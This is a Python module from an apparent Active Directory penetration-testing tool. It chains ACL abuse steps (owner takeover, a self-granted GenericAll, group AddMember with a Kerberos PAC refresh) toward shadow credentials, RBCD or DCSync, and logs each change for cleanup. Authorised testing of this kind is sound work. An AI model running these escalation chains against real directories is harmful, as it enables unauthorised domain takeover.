"""Control-to-wield escalation ladder for intermediate ACL control steps.

When an attack path contains a control-ACE step over an object that is **not**
the path's terminal step, and the *next* step depends on actually *wielding*
that control (e.g. ``WriteOwner`` over a group, then a ``GenericWrite`` the
group itself holds over another object), the executor must do more than the
grant. It must:

1. **Escalate to effective GenericAll** over the object:
   - ``owns`` / ``writeowner`` → set the object's owner to the executing
     principal, then grant a GenericAll ACE to that principal.
   - ``writedacl`` → grant a GenericAll ACE to the executing principal.
   - ``genericall`` / ``genericwrite`` → already effective; no rung needed.
2. **Wield** the control to enable the next edge, but **only when the next
   edge is sourced from this object**:
   - target is a **group** → AddMember(self) and force a Kerberos PAC refresh
     so the carry-forward principal authenticates with the new group SID.
   - target is a **user / computer / domain** → the wield of the next edge is
     the next step's own job (shadow credentials, RBCD, DCSync, ...). The
     ladder only supplies the escalation rung here and never injects a group
     membership refresh — a ``writedacl → domain → DCSync`` chain must stay a
     two-edge sequence that runs as the same principal with no PAC refresh.

Every mutation the ladder performs is registered with the deferred ACL
cleanup ledger (``owner_changed``, ``dacl_ace_added``, ``group_membership_changed``)
so the engagement can be unwound.

This module is the single source of truth for the intermediate
control-to-wield transition. It does **not** reimplement any exploitation
primitive — every rung drives ``execute_ace_step`` with a relation-remapped
copy of the caller's ``AceStepContext``. That context already carries the
*resolved* target (``target_sam_or_label`` — the bare name/DN, NOT the raw
graph label), the credentials, the target kind/domain/enabled state, and the
``member_to_add`` look-ahead, so every primitive resolves the target correctly
and the cleanup-ledger registration each handler already performs is reused for
free.

Recursion safety: ``execute_ace_step`` never calls back into
``ensure_control_to_wield_next_edge`` — the ladder is its only caller and is
invoked exactly once per step from ``attack_path_execution``. No rung may
re-invoke the ladder.
"""

from __future__ import annotations

from dataclasses import dataclass, field, replace
from typing import Any

from adscan_internal.cli.ace_step_execution import AceStepContext, execute_ace_step
from adscan_internal.rich_output import mark_sensitive, print_info_debug


# Relations that already confer effective GenericAll — no escalation rung.
_ALREADY_EFFECTIVE = {"genericall", "genericwrite"}
# Relations that require an owner change before the DACL is writable.
_OWNER_FIRST = {"owns", "writeowner"}
# Relations whose escalation rung is a DACL self-grant only.
_DACL_ONLY = {"writedacl"}


@dataclass
class ControlEscalationResult:
    """Outcome of an attempted control-to-wield escalation.

    Attributes:
        attempted: True when the ladder fired (a dependent next edge sourced
            from this object existed and the relation is in scope).
        escalated: True when the escalation rung(s) completed (owner set and/or
            GenericAll self-grant applied), or when none was needed.
        wielded: True when the next edge was wielded inline. For a group this
            is AddMember(self/member) + PAC refresh; for a user/computer it is
            the rich GenericAll abuse (FCP / ShadowCreds / WriteSPN for a user,
            RBCD / ShadowCreds for a computer) routed through ``execute_ace_step``
            with ``relation="genericall"``. False only when the target kind has
            no inline wield (e.g. a delegated-to-next-step domain target).
        wield_principal: The principal the *next* step must run as. For a group
            AddMember this is the added member (carry-forward); otherwise None
            (the wield handler leaves its own richer outcome on the shell).
        wield_credential: The credential matching ``wield_principal``.
        reason: Diagnostic string for logging / debug.
        cleanup_kinds: ACL cleanup kinds registered during the ladder.
    """

    attempted: bool = False
    escalated: bool = False
    wielded: bool = False
    # True when an inline wield was ATTEMPTED for this object kind (group
    # AddMember / user|computer GenericAll abuse). Distinguishes "wield attempted
    # but failed" (attempted_wield and not wielded → the step MUST fail) from "no
    # inline wield needed" (domain/OU target → attempted_wield stays False).
    attempted_wield: bool = False
    wield_principal: str | None = None
    wield_credential: str | None = None
    reason: str = ""
    cleanup_kinds: list[str] = field(default_factory=list)


def _norm(value: str | None) -> str:
    return str(value or "").strip().lower()


def _escalation_cache(shell: Any) -> dict[tuple[str, str, str], ControlEscalationResult]:
    """Return the per-shell idempotency cache keyed by (domain, to_label, relation)."""
    cache = getattr(shell, "_control_escalation_cache", None)
    if not isinstance(cache, dict):
        cache = {}
        setattr(shell, "_control_escalation_cache", cache)
    return cache


def ensure_control_to_wield_next_edge(
    shell: Any,
    *,
    exec_context: AceStepContext,
    control_relation: str,
    to_label: str,
    next_edge: dict[str, Any] | None,
) -> ControlEscalationResult:
    """Escalate an intermediate control ACE and wield it for the next edge.

    Every rung is driven by ``execute_ace_step`` with a relation-remapped copy
    of ``exec_context`` — the existing primitive handlers resolve the target via
    ``exec_context.target_sam_or_label`` (the bare name/DN), grant self
    GenericAll for non-domain targets, and register their own cleanup-ledger
    entries. This module never re-resolves the target nor reimplements an ACL
    write.

    Idempotent and keyed by ``(domain, to_label, control_relation)`` — calling
    twice in the same session returns the cached result without re-mutating AD.

    Args:
        shell: Active CLI shell instance (provides exploit_* wrappers,
            domains_data, environment_change_ledger, acl_cleanup_actions).
        exec_context: The resolved ``AceStepContext`` for THIS step. The ladder
            reads domain / exec_username / exec_password / target_domain /
            target_kind / target_sam_or_label / member_to_add from it.
        control_relation: The control ACE relation of THIS step (lowercase),
            one of ``owns``/``writeowner``/``writedacl``/``genericall``/
            ``genericwrite``.
        to_label: Canonical label of the controlled object — used only for the
            ``next_edge`` source match and logging.
        next_edge: The next step dict in the path, or None when this is the
            terminal step.

    Returns:
        ControlEscalationResult describing what happened and the principal the
        next step must run as.
    """
    relation = _norm(control_relation)
    kind = _norm(exec_context.target_kind)
    domain = exec_context.domain
    marked_to = mark_sensitive(to_label, "node")

    # Only act when there IS a dependent next edge sourced from this object.
    if not _next_edge_sourced_from(next_edge, to_label):
        return ControlEscalationResult(
            attempted=False,
            reason="no dependent next edge sourced from this object",
        )

    cache = _escalation_cache(shell)
    cache_key = (_norm(domain), _norm(to_label), relation)
    cached = cache.get(cache_key)
    if cached is not None:
        print_info_debug(
            "control-escalation:idempotent hit: "
            f"relation={relation} target={marked_to} "
            f"escalated={cached.escalated} wielded={cached.wielded}"
        )
        return cached

    result = ControlEscalationResult(attempted=True)

    # --- Escalation rung ---------------------------------------------------
    # Each rung drives execute_ace_step; the standalone writeowner handler
    # captures the original owner + registers owner_changed cleanup, and the
    # writedacl handler grants self GenericAll for non-domain targets +
    # registers dacl_ace_added — all reused for free, no manual capture/register.
    if relation in _OWNER_FIRST:
        if not _escalate_owner_then_dacl(shell, exec_context=exec_context, result=result):
            cache[cache_key] = result
            return result
    elif relation in _DACL_ONLY:
        if not _grant_generic_all_self(shell, exec_context=exec_context, result=result):
            cache[cache_key] = result
            return result
    elif relation in _ALREADY_EFFECTIVE:
        result.reason = "already effective GenericAll; no escalation rung"
    else:
        result.reason = f"unhandled control relation '{relation}'"
        cache[cache_key] = result
        return result

    result.escalated = True

    # --- Wield rung --------------------------------------------------------
    if kind == "group":
        result.attempted_wield = True
        _wield_group_add_member(shell, exec_context=exec_context, to_label=to_label, result=result)
    elif kind in {"user", "computer"}:
        result.attempted_wield = True
        # Drive the rich GenericAll abuse for the controlled principal:
        #   user     -> exploit_generic_all_user (FCP / WriteSPN / ShadowCreds auto-select)
        #   computer -> exploit_control_computer_object (RBCD / ShadowCreds)
        # Both produce the credential inside the handler and set their own
        # user_credential_obtained outcome — leave it intact for the handoff.
        wielded = execute_ace_step(shell, context=replace(exec_context, relation="genericall"))
        result.wielded = bool(wielded)
        result.reason = (
            f"escalation rung applied; wielded GenericAll on {kind} target "
            f"{mark_sensitive(to_label, 'node')}"
            if wielded
            else f"escalation rung applied; GenericAll wield failed on {kind} target"
        )
    else:
        # domain / ou — no inline wield; the next step (e.g. DCSync) runs as the
        # same principal with no PAC refresh.
        result.reason = (
            f"escalation rung applied; wield of next edge delegated to the "
            f"next step for {kind} target"
        )

    cache[cache_key] = result
    return result


def _next_edge_sourced_from(next_edge: dict[str, Any] | None, to_label: str) -> bool:
    """Return True when next_edge's source label matches the controlled object."""
    if not isinstance(next_edge, dict) or not to_label:
        return False
    details = next_edge.get("details") if isinstance(next_edge.get("details"), dict) else {}
    next_from = str(details.get("from") or "").strip()
    return bool(next_from) and next_from.upper() == to_label.strip().upper()


def _escalate_owner_then_dacl(
    shell: Any,
    *,
    exec_context: AceStepContext,
    result: ControlEscalationResult,
) -> bool:
    """Set object owner to executor (writeowner rung) then grant GenericAll-to-self.

    Both rungs run through ``execute_ace_step``: the writeowner handler captures
    the original owner and registers ``owner_changed`` cleanup; the writedacl
    handler grants self GenericAll and registers ``dacl_ace_added``. Returns
    True only when both rungs succeed.
    """
    marked_to = mark_sensitive(exec_context.to_label, "node")
    owner_ok = bool(execute_ace_step(shell, context=replace(exec_context, relation="writeowner")))
    if not owner_ok:
        result.reason = f"owner change failed on {exec_context.target_sam_or_label}"
        return False
    print_info_debug(f"control-escalation:owner set on {marked_to} via writeowner")

    # Now grant GenericAll-to-self via WriteDACL.
    return _grant_generic_all_self(shell, exec_context=exec_context, result=result)


def _grant_generic_all_self(
    shell: Any,
    *,
    exec_context: AceStepContext,
    result: ControlEscalationResult,
) -> bool:
    """Grant a GenericAll ACE to the executing principal via the writedacl handler.

    The writedacl handler (non-domain target) grants self GenericAll and
    registers ``dacl_ace_added`` cleanup. Returns True on success.
    """
    marked_to = mark_sensitive(exec_context.to_label, "node")
    ok = bool(execute_ace_step(shell, context=replace(exec_context, relation="writedacl")))
    if not ok:
        result.reason = f"GenericAll self-grant failed on {exec_context.target_sam_or_label}"
        return False
    print_info_debug(f"control-escalation:GenericAll granted to self on {marked_to}")
    return True


def _wield_group_add_member(
    shell: Any,
    *,
    exec_context: AceStepContext,
    to_label: str,
    result: ControlEscalationResult,
) -> None:
    """AddMember the carry-forward principal to the group and force a PAC refresh.

    Drives ``execute_ace_step`` with ``relation="addmember"`` — the handler
    resolves the group via ``target_sam_or_label``, honours ``member_to_add``
    (defaulting to the executor / self), and sets a ``group_membership_changed``
    outcome which the wiring's ``register_cleanup_from_outcome`` consumes. We do
    NOT drain or clobber that outcome here, and we do NOT manually register the
    membership cleanup.

    The PAC refresh is REQUIRED and lives here because intermediate steps never
    reach ``_run_runtime_followups`` (follow-ups are gated on the last
    executable index): without it the next step's bind would not carry the new
    group SID. The added member is read back from the executor's outcome so the
    refresh and carry-forward principal match whatever the handler chose.
    """
    marked_to = mark_sensitive(to_label, "group")
    wielded = execute_ace_step(shell, context=replace(exec_context, relation="addmember"))
    if not wielded:
        result.reason = f"AddMember failed on {exec_context.target_sam_or_label}"
        return

    # The executor set a group_membership_changed outcome carrying the principal
    # it actually added; read it WITHOUT consuming it (the wiring handoff still
    # needs it) so the PAC refresh + carry-forward principal stay consistent.
    added_user = exec_context.member_to_add or exec_context.exec_username
    outcome = getattr(shell, "_last_ace_execution_outcome", None)
    if isinstance(outcome, dict) and str(outcome.get("added_user") or "").strip():
        added_user = str(outcome["added_user"]).strip()

    # Force a fresh ccache so the next step's bind carries the new group SID.
    _force_pac_refresh(
        shell,
        domain=exec_context.target_domain or exec_context.domain,
        added_user=added_user,
        credential=exec_context.exec_password,
    )

    result.wielded = True
    result.wield_principal = added_user
    result.wield_credential = exec_context.exec_password
    result.reason = f"AddMember + PAC refresh on group {to_label}"
    print_info_debug(
        f"control-escalation:wielded group {marked_to}: added member + refreshed PAC"
    )


def _force_pac_refresh(
    shell: Any, *, domain: str, added_user: str, credential: str
) -> None:
    """Force a fresh TGT for the added principal so its PAC carries the new SID."""
    if not credential:
        print_info_debug(
            "control-escalation:no credential to refresh PAC for "
            f"{mark_sensitive(added_user, 'user')}"
        )
        return
    try:
        from adscan_internal.cli.attack_step_followups import (  # noqa: PLC0415
            _refresh_group_membership_ticket,
        )

        _refresh_group_membership_ticket(
            shell,
            domain=domain,
            added_user=added_user,
            credential=credential,
        )
    except Exception:  # noqa: BLE001
        print_info_debug(
            "control-escalation:PAC refresh helper unavailable; the next step "
            "will rely on credential-based auth"
        )

